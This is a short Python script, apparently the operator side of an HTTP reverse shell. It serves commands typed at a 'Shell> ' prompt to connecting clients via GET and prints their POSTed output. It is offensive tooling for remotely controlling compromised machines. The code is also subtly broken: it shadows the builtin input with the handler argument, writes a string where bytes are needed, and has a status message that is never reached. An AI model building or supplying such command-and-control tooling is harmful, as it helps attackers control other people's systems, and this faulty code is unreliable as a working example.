from http.server import BaseHTTPRequestHandler, HTTPServer

#   Required constants
HOST_ADDR = '0.0.0.0'
PORT = 80

class HTTPHandler(BaseHTTPRequestHandler):

    # Gets user input and send it to client with request headers
    def do_GET(input):
        command = input("Shell> ")
        input.send_response(200)
        input.send_header("Content-type", "text/html")
        input.end_headers()
        input.wfile.write(command)

    # Gets data from the POST request & prints it out.    
    def do_POST(input):
        input.send_response(200)
        input.end_headers()
        request_length = int(input.headers['Content-Length'])
        request_data = input.rfile.read(request_length)
        print(request_data)

# Run the server with our custom handler.
if __name__ == '__main__':

    httpd = HTTPServer((HOST_ADDR, PORT), HTTPHandler)

    try:
        httpd.serve_forever()
        print('[!] Server is running!')
    except KeyboardInterrupt:
        print('[!] Server is terminated.')
        httpd.server_close()

        
